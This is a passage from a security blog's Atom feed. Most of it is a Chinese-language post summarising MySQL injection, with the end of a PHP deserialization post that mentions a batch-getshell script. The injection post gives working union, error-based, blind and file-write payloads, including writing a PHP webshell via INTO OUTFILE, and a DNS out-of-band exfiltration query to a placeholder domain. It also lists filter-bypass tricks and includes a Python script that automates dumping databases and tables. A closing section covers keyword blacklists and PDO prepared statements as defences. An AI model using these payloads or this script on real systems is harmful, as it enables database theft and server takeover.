href="http://seaii-blog.com/index.php/2017/09/12/70.html" target="_blank" rel="noopener">php对象注入总结</a><br>10.<a href="https://www.anquanke.com/post/id/84922" target="_blank" rel="noopener">PHP反序列化漏洞成因及漏洞挖掘技巧与案例</a>  </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://i.loli.net/2018/06/10/5b1d41bf19383.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;起因：最近日站的时候，对一个typecho博客经历几番波折之后，最后找了个typecho反序列化漏洞的exp、写了个webshell..开心的不得了…带着对反序列化漏洞满满的好奇心学习了一番。&lt;br&gt;批量getshell脚本已发布：&lt;a href=&quot;https://github.com/Passer6y/typecho_auto_getshell&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;github&lt;/a&gt;  &lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Code" scheme="http://passer6y.fun/categories/Code/"/>
    
    
      <category term="PHP反序列化" scheme="http://passer6y.fun/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>MySql Injection Conclusion</title>
    <link href="http://passer6y.fun/2017/12/23/Sql%20injection%20Conclusion/"/>
    <id>http://passer6y.fun/2017/12/23/Sql injection Conclusion/</id>
    <published>2017-12-23T12:51:00.000Z</published>
    <updated>2018-06-11T11:19:20.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a><img src="http://ww4.sinaimg.cn/large/0060lm7Tly1fmrx0wif4cj31fe0k4din.jpg" alt="sql 注入导图"></h2><a id="more"></a><h1 id="0x02-基于有正确回显的注入"><a href="#0x02-基于有正确回显的注入" class="headerlink" title="0x02 基于有正确回显的注入"></a>0x02 基于有正确回显的注入</h1><p>1.判断注入点、注入位置<br><br>2.判断是否被过滤，绕过<br><br>3.order by联合查询，找到对应的列数<br><br>4.联合查询注入：<br><del><em>这里假设有三个字段</em></del><br><br>①爆库：  </p><pre><code>id=-1&apos; union select 1,group_concat(schema_name),3 from information_schema.schemata --+</code></pre><p>②爆表名：<del><em>这里假设爆出了security数据库</em></del><br></p><pre><code>id=-1&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&apos;security&apos; --+</code></pre><p>③爆列名:<del><em>假设爆出一个users表</em></del><br></p><pre><code>id=-1&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos; --+</code></pre><p>④爆数据：</p><pre><code>id=-1&apos; Union select 1,username,password from users limit 0,1 --+</code></pre><p>Tips:</p><blockquote><p>有时候可能当前页面数据库和敏感信息数据库不是同一个库，所以有时候会这样写<br>id=-1’ Union select 1,username,password from security.users limit 0,1 –+<br>或者id=-1’ Union select 1,username,password from `users` limit 0,1 –+  </p></blockquote><h1 id="0x03-基于构造错误sql语句的报错注入"><a href="#0x03-基于构造错误sql语句的报错注入" class="headerlink" title="0x03 基于构造错误sql语句的报错注入"></a>0x03 基于构造错误sql语句的报错注入</h1><p><strong>1.  需要知道以下几个函数：<br></strong><br>    ①Group by: 分组，合并相同的，并且按字母顺序排列。<br><br>    ②rand()   // 随机函数（0，1）<br><br>    ③floor() //取整函数 比如floor(1.2)=1 <br><br>    ④count()  //汇总函数<br><br><strong>2.  原理:</strong> <br><br>   简而言之就是利用 select count(<em>),concat(floor(random(0)</em>2))as key from…….group by key来报错。<br><br>    即rand函数产生的随机数取整之后被 group by 子句被分为key值等于1 和0 两类，然后count()统计该类型下的个数<br><img src="http://ww4.sinaimg.cn/large/0060lm7Tly1fmrxjhcopnj30q305h0sr.jpg" alt=""><br>    可以发现有时候回报错<br><img src="http://ww1.sinaimg.cn/large/0060lm7Tly1fmrxklb9g9j30om0380sv.jpg" alt=""><br>    我们就可以通过这种手段来获取敏感信息</p><pre><code>那么问题来了：为什么会报错呢？双注入的原理，简单一句话原理就是有研究人员发现，当在一个聚合函数，比如count函数后面如果使用分组语句（group by）就会把查询的一部分以错误的形式显示出来“通过floor报错的方法来爆数据的本质是group by语句的报错。Group by 在分组的时候先会对前面的concat(floor(rand()*2))进行检测，无疑只有0和1 两种结果 进行分类，然后就会插入这条数据 插入的过程中又会再进行一次计算 如果检测所计算出来的数和插入时所计算出来的数不一样，这个时候就会报错。&lt;br /&gt;</code></pre><p><strong>3.实际操作(和有正确回显的操作类似)</strong><br><br>①爆库：</p><pre><code>?id=-1&apos; and  (select 1  from (select count(*),concat(0x3a,(select schema_name from information_schema.schemata  limit 0,1 ),floor(rand()*2 ),0x3a,0x3a )name from  information_schema.tables group by name) b) --+</code></pre><p>②爆表名<br>③爆列名<br>④爆数据：</p><pre><code>?id=-1&apos; and  (select 1  from (select count(*),concat(0x3a,(select password from users limit 0,1 ),floor(rand()*2 ),0x3a,0x3a )name from  information_schema.tables group by name) b) --+</code></pre><blockquote><p><strong>其他更多函数的报错注入</strong><br>extractvalue()、updatexml()、GeometryCollection()、polygon()、multipoint()、multilinestring()、multipolygon()、linestring()、exp()<br>以后再深入练习吧..  </p></blockquote><h1 id="0x04基于文件读写权限的注入"><a href="#0x04基于文件读写权限的注入" class="headerlink" title="0x04基于文件读写权限的注入"></a>0x04基于文件读写权限的注入</h1><p><strong>1.前提：</strong><br>需要my.ini(phpstudy中)里面的 secur_file_priv变量为空，不敢一般MySQL5.5.53之前的版本默认为空，之后的版本为null，所以说这种注入比较依赖MySQL的版本。<br>可以使用：select @@secure_file_priv来查询权限。<br>关于secur_file_priv变量更多：</p><blockquote><p>如果变量设置为目录的名称，则服务器会将导入和导出操作限制在跟这个目录中一起使用。这个目录必须存在，服务器不会自己创建它。<br>如果变量为空，则不会产生影响，引起不安全的配置。<br>如果变量设置为NULL，那么服务器就会禁用导入和导出操作。这个值从MySQL 5.5.53版本开始允许。</p></blockquote><p><strong>2.需要知道的函数：</strong><br>①Load_file：读文件<br>②INTO DUMPFILE/OUTFILE：将表的内容导出为一个文本文件  </p><blockquote><p>Tips：<br>INTO OUTFILE函数写文件时会在每一行的结束自动加上换行符<br>INTO DUMPFILE函数在写文件会保持文件得到原生内容，这种方式对于二进制文件是最好的选择   </p></blockquote><p>实际演示：<br>select * from users into outfile ‘d:/1.txt’;<br>select load_file(‘d:/1.txt’)<br><img src="http://ww4.sinaimg.cn/large/0060lm7Tly1fmrxxaivg0j30nx0jhaak.jpg" alt=""><br>3.实际操作(两种思路)<br>①上菜刀  </p><pre><code>?id=1&apos;)) union select 1,2,0x3c3f70687020706870696e666f28293b3f3e into outfile &apos;D:/phpStudy/www/1234.php&apos;   --+</code></pre><blockquote><p>Tips：?在URL里面表示传参，如果一句话木马里面有 ?php  所以用get传参的 会将php当作变量。</p></blockquote><p>②改扩展名绕过操作：</p><pre><code>?id=1&apos;)) union select 1,2,load_file(&apos;D:/phpStudy/www/1234.php&apos;) into outfile &apos;D:/phpStudy/www/123455.txt&apos;   --+</code></pre><h1 id="0x05盲注"><a href="#0x05盲注" class="headerlink" title="0x05盲注"></a>0x05盲注</h1><p><strong>1.相关函数：</strong><br>①length():返回字符串的长度<br>②substr():截取字符串<br>  substr(a,b,c)从b位置开始，截取字符串a的c长度，ascii()将字符转换为ascii码格式。<br>③ascii():返回字符的ascii码<br>④if():<br>If(exor1,expr2,expr3)在mysql中是第一个参数成立的时候执行第二个参数，否则执行第三个参数<br><strong>2.实际操作：</strong><br>①判断注入点：  </p><pre><code>Id=-1&apos; or sleep(5) --+</code></pre><p>②爆库：  </p><pre><code>If(Ascii(substr(select schema_name from information_schema.schemata limit 0,1),1,1))=100,sleep(),null)as name</code></pre><p>③爆表<br>④爆字段<br>⑤爆数据<br>都是一样的套路  </p><blockquote><p>Tips：<br>substr()的小技巧：例如在substr(database(),1,1)中逗号被过滤了，我们可以使用from 1 to 1来绕过过滤。<br>那么有同样格式的limit 0,1有没有这样的绕过呢？当然有。格式为：1 offset 0这里注查询数字的顺序。</p></blockquote><h1 id="0x06多种位置的注入："><a href="#0x06多种位置的注入：" class="headerlink" title="0x06多种位置的注入："></a>0x06多种位置的注入：</h1><p>其实都是一样的方法，只是位置不一样。<br>一般来说，有以下几种注入位置：<br>1.Get、Post<br>2.UA头<br>3.referer头<br>4.cookie</p><h1 id="0x07带外通道："><a href="#0x07带外通道：" class="headerlink" title="0x07带外通道："></a>0x07带外通道：</h1><p><strong>什么是带外通道注入？</strong></p><blockquote><p>使用背景：<br>在进行sql注入攻击的时候我们经常会遇见无回显的情况，那我们就不能进行注入了么？<br>其实攻击可能已经成功了，But应用程序未返回任何结果，使你误以为攻击失败。<br>一种获取数据的有效方法是使用带外通道<br>能够在数据库中执行任意SQL语句后,我们可以利用数据的一些内置功能在数据库与自己的计算机直接建立网络连接,通过它传送从数据库中收集的任何信息<br>一般可以提取数据的途径:<br>通过HTTP(S)请求、DNS剖析、文件系统、电子邮件等等</p></blockquote><p><strong>对于MySQL而言</strong><br>同样和文件读写一样，需要secure_file_priv这个全局变量控制的权限，具体见0x03中对该变量的介绍。<br>利用条件：  </p><ul><li>全局变量secure_file_priv = ‘ ‘  </li><li>可以用SQL server连接到mysql数据库    </li></ul><p><strong>使用DNS解析提取数据</strong><br>在mysql中会对查询语句中的ip和网址尝试DNS解析。例如：</p><pre><code>select load_file(concat(‘\\\\’,version()’yoursite.com\\a.txt’));</code></pre><p>然后我们可以通过抓包看MySql发出的DNS查询数据<br>或者使用网上现成的<a href="http://dnsbin.zhack.ca/" target="_blank" rel="noopener">http://dnsbin.zhack.ca/</a> 就可以看到mysql发送过来的数据</p><!--**以2017HCTF为例**部分源码如下：    <?php    echo "Bob received a mission to write a login system on someone else's server, and he he only finished half of the work<br />";    echo "flag is hctf{what you get}<br /><br />";    error_reporting(E_ALL^E_NOTICE^E_WARNING);    try {       $conn = new PDO( "sqlsrv:Server=*****;Database=not_here","oob", "");     }    catch( PDOException $e ) {       die( "Error connecting to SQL Server".$e->getMessage() );     }    #echo "Connected to MySQL<br />";    echo "Connected to SQL Server<br />";    $id = $_GET['id'];    if(preg_match('/EXEC|xp_cmdshell|sp_configure|xp_reg(.*)|CREATE|DROP|declare|insert|into|outfile|dumpfile|sleep|wait|benchmark/i', $id)) {        die('NoNoNo');    }    $query = "select message from not_here_too where id = $id"; //link server: On  linkname:mysql    $stmt = $conn->query( $query );     while ( @$row = $stmt->fetch( PDO::FETCH_ASSOC ) ){        //TO DO: ...        //It's time to sleep...    }    ?>                 -->   <h1 id="0x08各种绕过姿势："><a href="#0x08各种绕过姿势：" class="headerlink" title="0x08各种绕过姿势："></a>0x08各种绕过姿势：</h1><p><strong>绕过单引号</strong></p><p><strong>大小写绕过</strong>     </p><pre><code>?id=1+UnIoN+SeLecT+1,2,3--  </code></pre><p><strong>替换绕过</strong>  </p><pre><code>?id=1+UNunionION+SEselectLECT+1,2,3--  </code></pre><p><strong>注释绕过</strong></p><pre><code>?id=1+un/**/ion+se/**/lect+1,2,3--</code></pre><p><strong>特殊嵌入绕过</strong></p><pre><code>?id=1/*!UnIoN*/SeLecT+1,2,3--  //在别的数据库中是注释但是在mysql中可以成功执行在语句前可以加上5位数字，代表版本号，表示只有在大于该版本的mysql中不作为注释 </code></pre><p><strong>宽字节注入</strong><br>SQL注入中的宽字节国内最常使用的gbk编码，这种方式主要是绕过addslashes等对特殊字符进行转移的绕过。反斜杠()的十六进制为%5c，在你输入%bf%27时，函数遇到单引号自动转移加入\，此时变为%bf%5c%27，%bf%5c在gbk中变为一个宽字符“縗”。%bf那个位置可以是%81-%fe中间的任何字符。不止在sql注入中，宽字符注入在很多地方都可以应用。<br>在我们代码审计的过程中产生这个注入的原因有两个<br>1.character_set_client=gbk(SET NAMES的误用)<br>2.mysql_real_escape_string()的错误使用</p><p><strong>二次urldecode注入绕过</strong><br>在我们代码审计的时候如果某处用了urldecode或者rawurldecode函数，则会二次解码(webserver和该函数)而绕过gpc或者是addslashes等过滤函数。</p><p><strong>特殊字符绕过空格</strong>  </p><p>Example: </p><pre><code>&apos;%0AUNION%0CSELECT%A0NULL%20%23</code></pre><p><strong>注释符&amp;引号</strong></p><pre><code>①SELECT DISTINCT(db) FROM mysql.db WHERE `Host`=&apos;localhost&apos; and/**/1=1;②SELECT DISTINCT(db) FROM mysql.db WHERE `Host`=&apos;localhost&apos; and&quot;1=1&quot;;</code></pre><p><strong>编码绕过</strong><br>URL编码、HEX编码、Base64编码</p><h1 id="0x09利用工具"><a href="#0x09利用工具" class="headerlink" title="0x09利用工具"></a>0x09利用工具</h1><p>1.sqlmap<br>2.Pangolin（穿山甲）<br>3.Domain等等  </p><h1 id="0x10如何用python写工具？"><a href="#0x10如何用python写工具？" class="headerlink" title="0x10如何用python写工具？"></a>0x10如何用python写工具？</h1><p>在我简单学习了requests库、和re库之后，编写了一个简单的脚本(第一次写bug有点多、局限也很多..)  </p><pre><code>#coding=UTF-8import reimport requestsfrom bs4 import BeautifulSoupimport sysreload(sys)sys.setdefaultencoding(&apos;utf8&apos;)def getHTMLText(url):    try:        r = requests.get(url)        r.raise_for_status()        r.encoding = r.apparent_encoding        return r.text    except:        print(&quot;getHTMLText error&quot;)    return &quot;getHTMLText right&quot;#捕捉返回的错误，判断注入点def sqlloc_error(html,url,lists):    try:        error = re.search(r&apos;syntax&apos;,html)        if error:            lists.append(url)    except:        return &quot;rightback error&quot;#构造注入点的urldef testsql(start_url,lists):    injects = [&apos;\&apos;&apos; , &apos;\&quot;&apos; ,&apos;)&apos;, &apos;\&apos;)&apos;, &apos;\&quot;)&apos;]    for inject in injects:        url = start_url + inject        html = getHTMLText(url)        sqlloc_error(html,url,lists)#捕捉爆库返回的字段def sqlrep_back(html,payload_reps):    try:        soup = BeautifulSoup(html,&quot;html.parser&quot;)        Rep = soup.select(&quot;font &gt; font&quot;)        NRep = Rep[0].text        NNRep = NRep.split(&apos;:&apos;)[2]        num = len(NNRep.split(&apos;,&apos;))        for i in range(num):            payload_reps.append(NNRep.split(&apos;,&apos;)[i])            print(payload_reps[i])    except:        return &quot;sqlrep_back error&quot;#爆库(这里还没有实现自动判断字段数，下面的payload也可以写成批量)def BoomRepository(list,payload_reps):    newurl = list + &quot; union select 1,2,group_concat(schema_name) from information_schema.schemata --+&quot;    html = getHTMLText(newurl)    sqlrep_back(html,payload_reps)#捕捉爆出的表def sqltab_back(html,payload_tables):    try:        soup = BeautifulSoup(html,&apos;html.parser&apos;)        Tab = soup.select(&quot;font &gt; font&quot;)        NTab = Tab[0].text        NNTab = NTab.split(&apos;:&apos;)[2]        num = len(NNTab.split(&apos;,&apos;))        for i in range(num):            payload_tables.append(NNTab.split(&apos;,&apos;)[i])            print(payload_tables[i])    except:        print(&quot;sqltab_back error&quot;)#爆表def BoomTable(list,payload_columns,payload_tables,payload_reps):    for payload_rep in payload_reps:        newurl = list + &quot; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&apos;&quot; + payload_rep + &quot;&apos; --+&quot;        print(&quot;-----------正在爆&quot; + payload_rep + &quot;库的表-----------&quot;)        html = getHTMLText(newurl)        sqltab_back(html,payload_tables)        for payload_table in payload_tables:            print(&quot;-------------------------正在爆&quot; + payload_rep +&quot;库的&quot; + payload_table + &quot;表的字段-------------------------&quot;)            Boomcolumn(list, payload_tables,payload_columns)#捕捉爆出的字段def sqlcol_back(html,payload_columns):    try:        soup = BeautifulSoup(html,&apos;html.parser&apos;)        Col = soup.select(&quot;font &gt; font&quot;)        NCol = Col[0].text        NNCol = NCol.split(&apos;:&apos;)[2]        num = len(NNCol.split(&apos;,&apos;))        for i in range(num):            payload_columns.append(NNCol.split(&apos;,&apos;)[i])            print(payload_columns[i])    except:        print(&quot;sqlcol_back error&quot;)#爆字段def Boomcolumn(list, payload_tables,payload_columns):    for payload_table in payload_tables:        newurl = list + &quot; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&apos;&quot; + payload_table + &quot;&apos; --+&quot;        html = getHTMLText(newurl)        sqlcol_back(html, payload_columns)def main():    lists = []  #判断是否有注入点的url    payload_reps = [] #爆出来的库的列表    payload_tables = [] #爆出来的表的列表、    payload_columns = [] #爆出来的字段    start_url = &apos;http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&apos;    testsql(start_url,lists)    print(&quot;-----------------------正在爆库--------------------------&quot;)    BoomRepository(lists[0], payload_reps)    print(&quot;------------------------正在爆表--------------------------&quot;)    BoomTable(lists[0], payload_columns, payload_tables, payload_reps)main()                </code></pre><h1 id="0x11如何防御？"><a href="#0x11如何防御？" class="headerlink" title="0x11如何防御？"></a>0x11如何防御？</h1><blockquote><p><strong>引发SQL注入漏洞的原因：</strong><br>动态SQL或者将SQL查询组装成包含受用户控制的输入的字符串并提交给数据库</p></blockquote><h3 id="使用黑名单验证"><a href="#使用黑名单验证" class="headerlink" title="使用黑名单验证"></a><strong>使用黑名单验证</strong></h3><p>我们进行SQL注入的时候肯定离不开这些关键词：</p><ul><li>and、or、order </li><li>insert、into</li><li>delete</li><li>replace、update </li><li>union、select</li><li>load_file、outfile</li><li>和一些特殊符号  </li></ul><p>具体的实现代码：</p><pre><code>private function filter_keyword( $string ) { $keyword=&apos;select|insert|update|delete|\&apos;|\/\*|\*|\.\.\/|\.\/|union|and|union|order|or|into|load_file|outfile&apos;; $arr = explode( &apos;|&apos;, $keyword ); $result = str_ireplace( $arr, &apos;&apos;, $string ); return $result; } </code></pre><p>当然这里这是一个基本的思路，实际环境中还需要更强大的正则来进行黑名单过滤。</p><h3 id="正确使用过滤方式"><a href="#正确使用过滤方式" class="headerlink" title="正确使用过滤方式"></a><strong>正确使用过滤方式</strong></h3><p>1.gpc/runtime魔术引号：bug来源无非两种方式，一种是从类似于get、post等中被动式的获得参数;还有一种是主动的获得参数，比如读取远程页面或者文件。所以gpc/runtime在这就很重要了。<br>2.addslashes函数(字符型防御)、mysql_[real_]escape_string函数、intval函数等等</p><h3 id="使用预处理语句：PDO"><a href="#使用预处理语句：PDO" class="headerlink" title="使用预处理语句：PDO"></a><strong>使用预处理语句：PDO</strong></h3><blockquote><p><strong>什么是PDO？</strong><br>PDO是PHP Data Objects（php数据对象）的缩写。是在php5.1版本之后开始支持pdo。你可以把pdo看做是php提供的一个类。它提供了一组数据库抽象层API，使得编写php代码不再关心具体要连接的数据库类型。你既可以用使用pdo连接mysql，也可以用它连接oracle。并且pdo很好的解决了sql注入问题。  </p><p><strong>为什么要使用PDO查询?</strong><br>使用传统的 mysql_connect 、mysql_query方法来连接查询数据库时，如果过滤不严紧，就有SQL注入风险。虽然可以用mysql_real_escape_string()函数过滤用户提交的值，但是也有缺陷。而使用PHP的PDO扩展的 prepare 方法，就可以避免sql injection 风险。</p></blockquote><h4 id="具体实现方法"><a href="#具体实现方法" class="headerlink" title="具体实现方法"></a>具体实现方法</h4><pre><code>$dbh = new PDO(&quot;mysql:host=localhost; dbname=demo&quot;, &quot;user&quot;, &quot;pass&quot;);$dbh-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false); //禁用prepared statements的仿真效果，确保传递到mysql服务器之前没有被PHP解析(禁止了所有可能的sql注入)  $dbh-&gt;exec(&quot;set names &apos;utf8&apos;&quot;); $sql=&quot;select * from test where name = ? and password = ?&quot;;$stmt = $dbh-&gt;prepare($sql); $exeres = $stmt-&gt;execute(array($testname, $pass)); if ($exeres) { while ($row = $stmt-&gt;fetch(PDO::FETCH_ASSOC)) {print_r($row);}}$dbh = null;</code></pre><p>其实到这里我也不是很懂原理，然后搜索了一下资料了解了一下PHP与 mysql sever通讯细节：</p><blockquote><p>为何PDO能防SQL注入？<br>请先看以下PHP代码：  </p></blockquote><pre><code>&lt;?php$pdo = new PDO(&quot;mysql:host=192.168.0.1;dbname=test;charset=utf8&quot;,&quot;root&quot;);$conn-&gt;setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_EXCEPTION); // set the PDO error mode to exception$st = $pdo-&gt;prepare(&quot;select * from info where id =? and name = ?&quot;);$id = 21;$name = &apos;zhangsan&apos;;$st-&gt;bindParam(1,$id);$st-&gt;bindParam(2,$name);$st-&gt;execute();$st-&gt;fetchAll();?&gt;</code></pre><blockquote><p>环境如下：<br>PHP 5.4.7<br>Mysql 协议版本 10<br>MySQL Server 5.5.27<br>为了彻底搞清楚php与mysql server通讯的细节，我特别使用了wireshark抓包进行研究之,安装wireshak之后，我们设置过滤条件为tcp.port==3306, 如下图：<br><img src="http://dl2.iteye.com/upload/attachment/0082/1266/cfa06567-b3c0-3976-a33f-83273f7a6622.jpg" alt=""><br>如此只显示与mysql 3306端口的通信数据，避免不必要的干扰。<br>特别要注意的是wireshak基于wincap驱动，不支持本地环回接口的侦听（即使用php连接本地mysql的方法是无法侦听的），请连接其它机器（桥接网络的虚拟机也可）的MySQL进行测试。<br>然后运行我们的PHP程序，侦听结果如下，我们发现，PHP只是简单地将SQL直接发送给MySQL Server :<br><img src="http://dl2.iteye.com/upload/attachment/0082/1268/78ca895f-3dcf-39f3-a452-cb347a4807d1.jpg" alt=""><br>其实，这与我们平时使用mysql_real_escape_string将字符串进行转义，再拼接成SQL语句没有差别（只是由PDO本地驱动完成转义的），显然这种情况下还是有可能造成SQL注入的，也就是说在php本地调用pdo prepare中的mysql_real_escape_string来操作query，使用的是本地单字节字符集，而我们传递多字节编码的变量时，有可能还是会造成SQL注入漏洞(php 5.3.6以前版本的问题之一，这也就解释了为何在使用PDO时，建议升级到php 5.3.6+，并在DSN字符串中指定charset的原因。<br>针对php 5.3.6以前版本，以下代码仍然可能造成SQL注入问题：</p></blockquote><pre><code>$pdo-&gt;query(&apos;SET NAMES GBK&apos;); $var = chr(0xbf) . chr(0x27) . &quot; OR 1=1 /*&quot;; $query = &quot;SELECT * FROM info WHERE name = ?&quot;; $stmt = $pdo-&gt;prepare($query); $stmt-&gt;execute(array($var)); </code></pre><blockquote><p>原因与上面的分析是一致的。<br>而正确的转义应该是给mysql Server指定字符集，并将变量发送给MySQL Server完成根据字符转义。<br>那么，如何才能禁止PHP本地转义而交由MySQL Server转义呢？<br>PDO有一项参数，名为PDO::ATTR_EMULATE_PREPARES ，表示是否使用PHP本地模拟prepare，此项参数默认值未知。而且根据我们刚刚抓包分析结果来看，php 5.3.6+默认还是使用本地变量转，拼接成SQL发送给MySQL Server的，我们将这项值设置为false, 试试效果，如以下代码：  </p></blockquote><pre><code>&lt;?php$pdo = new PDO(&quot;mysql:host=192.168.0.1;dbname=test;&quot;,&quot;root&quot;);$pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);$st = $pdo-&gt;prepare(&quot;select * from info where id =? and name = ?&quot;);$id = 21;$name = &apos;zhangsan&apos;;$st-&gt;bindParam(1,$id);$st-&gt;bindParam(2,$name);$st-&gt;execute();$st-&gt;fetchAll();?&gt;</code></pre><blockquote><p>红色行是我们刚加入的内容，运行以下程序，使用wireshark抓包分析，得出的结果如下：<br><img src="http://dl2.iteye.com/upload/attachment/0082/1270/4b73404b-3cc7-37c7-8679-5200e7dc872e.jpg" alt=""><br><img src="http://dl2.iteye.com/upload/attachment/0082/1272/1853a6e4-6e77-3297-921f-19132a5df698.jpg" alt=""><br>看到了吗？这就是神奇之处，可见这次PHP是将SQL模板和变量是分两次发送给MySQL的，由MySQL完成变量的转义处理，既然变量和SQL模板是分两次发送的，那么就不存在SQL注入的问题了，但需要在DSN中指定charset属性，如：  </p></blockquote><pre><code>$pdo = new PDO(&apos;mysql:host=localhost;dbname=test;charset=utf8&apos;, &apos;root&apos;);</code></pre><!--# 0x12 代码审计sql注入思路 -->    <p>参考文献：<a href="http://zhangxugg-163-com.iteye.com/blog/1835721" target="_blank" rel="noopener">http://zhangxugg-163-com.iteye.com/blog/1835721</a>  </p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;img src=&quot;http://ww4.sinaimg.cn/large/0060lm7Tly1fmrx0wif4cj31fe0k4din.jpg&quot; alt=&quot;sql 注入导图&quot;&gt;&lt;/h2&gt;
    
    </summary>
    
      <category term="SQL" scheme="http://passer6y.fun/categories/SQL/"/>
    
    
      <category term="SQL注入" scheme="http://passer6y.fun/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
</feed>
